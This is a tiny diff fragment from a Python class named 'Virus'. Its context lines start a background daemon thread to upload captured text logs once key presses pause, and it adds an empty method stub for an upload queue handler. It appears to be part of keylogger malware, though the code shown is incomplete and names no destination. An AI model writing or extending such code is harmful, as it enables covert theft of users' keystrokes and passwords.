@@ -58,3 +58,5 @@ class Virus(object):
             if not self.texts: continue
             if not (time.time() - self.last_press) > self.MAX_LAST_PRESS: continue
             threading.Thread(target=self._upload_logs, daemon=True).start()
+
+    def _upload_queue_handler(self):
